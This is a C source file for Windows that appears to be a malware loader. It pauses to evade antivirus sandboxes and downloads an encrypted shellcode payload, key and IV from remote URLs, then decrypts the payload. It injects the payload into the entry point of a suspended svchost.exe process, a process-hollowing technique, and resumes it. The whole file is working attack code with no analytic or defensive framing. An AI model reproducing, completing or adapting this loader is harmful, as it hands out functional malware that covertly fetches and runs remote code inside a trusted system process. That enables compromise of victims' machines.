#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include "Aes.h"
#include "DropperProcessHollowing.h"
#include "Downloader.h"


int main(int argc, char* argv[]) {
    // AV evasion: Sleep and timing check
    ULONGLONG start = GetTickCount64();
    Sleep(10000);
    if ((GetTickCount64() - start) < 9500) {
        return 0;
    }

    PBYTE encrypted_payload;
    PBYTE key;
    PBYTE iv;
    SIZE_T encrypted_payload_size;
    SIZE_T common_len;

    if (!GetPayloadFromUrl(ENCRYPTED_SHELLCODE_URL, &encrypted_payload, &encrypted_payload_size)) {
        return 1;
    }

    if (!GetPayloadFromUrl(KEY_URL, &key, &common_len)) {
        return 1;
    }

    if (!GetPayloadFromUrl(IV_URL, &iv, &common_len)) {
        return 1;
    }

    // Decrypt the payload
    uint8_t* payload = NULL;
    size_t payloadSize = 0;
    if (!aes_decrypt(encrypted_payload,
        encrypted_payload_size,
        key,
        iv,
        &payload,
        &payloadSize)) {
        fprintf(stderr, "aes_decrypt failed\n");
        return 1;
    }
    printf("AES decrypted payload (size: %zu bytes).\n", payloadSize);

    // Create suspended process
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));
    if (!CreateProcessA(NULL,
        "C:\\Windows\\System32\\svchost.exe",
        NULL, NULL, FALSE,
        CREATE_SUSPENDED,
        NULL, NULL,
        &si, &pi)) {
        fprintf(stderr, "CreateProcess failed (%lu)\n", GetLastError());
        HeapFree(GetProcessHeap(), 0, payload);
        return 1;
    }

    // Locate ZwQueryInformationProcess
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PFN_ZWQUERYINFORMATIONPROCESS ZwQueryInfo =
        (PFN_ZWQUERYINFORMATIONPROCESS)GetProcAddress(hNtdll, "ZwQueryInformationProcess");

    // Query PEB to get image base
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen;
    ZwQueryInfo(pi.hProcess,
        PROCESS_BASIC_INFORMATION_CLASS,
        &pbi,
        sizeof(pbi),
        &retLen);
    PBYTE peb = (PBYTE)pbi.PebBaseAddress;
    PBYTE basePtr = NULL;
    ReadProcessMemory(pi.hProcess,
        peb + 0x10,
        &basePtr,
        sizeof(basePtr),
        NULL);

    // Read PE header and calculate entrypoint
    BYTE header[512];
    ReadProcessMemory(pi.hProcess,
        basePtr,
        header,
        sizeof(header),
        NULL);
    DWORD e_lfanew = *(DWORD*)(header + 0x3C);
    DWORD entryRVA = *(DWORD*)(header + e_lfanew + 0x28);
    PBYTE entry = basePtr + entryRVA;
    printf("Entrypoint at 0x%p\n", entry);

    // Write decrypted payload
    SIZE_T written;
    if (!WriteProcessMemory(pi.hProcess,
        entry,
        payload,
        payloadSize,
        &written)) {
        fprintf(stderr, "WriteProcessMemory failed (%lu)\n", GetLastError());
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        HeapFree(GetProcessHeap(), 0, payload);
        return 1;
    }
    printf("Payload written to entrypoint.\n");

    // Cleanup and resume
    HeapFree(GetProcessHeap(), 0, payload);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}